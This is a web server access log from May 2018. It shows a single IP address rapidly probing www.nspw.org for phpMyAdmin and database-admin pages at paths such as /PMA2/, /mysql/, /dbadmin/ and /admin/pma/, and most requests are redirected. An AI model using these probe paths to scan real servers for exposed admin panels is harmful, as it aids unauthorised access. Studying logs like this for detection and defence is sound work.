www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:20 -0400] "GET /PMA2/index.php HTTP/1.1" 302 558 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:20 -0400] "GET /PMA2/index.php HTTP/1.1" 302 558 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:20 -0400] "GET /pmamy/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:20 -0400] "GET /pmamy/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:21 -0400] "GET /pmamy2/index.php HTTP/1.1" 302 562 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:21 -0400] "GET /pmamy2/index.php HTTP/1.1" 302 562 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:21 -0400] "GET /mysql/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:21 -0400] "GET /mysql/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:21 -0400] "GET /admin/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:21 -0400] "GET /admin/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:22 -0400] "GET /db/index.php HTTP/1.1" 302 554 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:22 -0400] "GET /db/index.php HTTP/1.1" 302 554 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:22 -0400] "GET /dbadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:22 -0400] "GET /dbadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:22 -0400] "GET /web/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:22 -0400] "GET /web/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:22 -0400] "GET /admin/pma/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:23 -0400] "GET /admin/pma/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:23 -0400] "GET /admin/PMA/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:23 -0400] "GET /admin/mysql/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:23 -0400] "-" 408 0 "-" "-"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:23 -0400] "-" 408 0 "-" "-"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:23 -0400] "GET /admin/mysql2/index.php HTTP/1.1" 302 574 "-" "Mozilla/5.0"
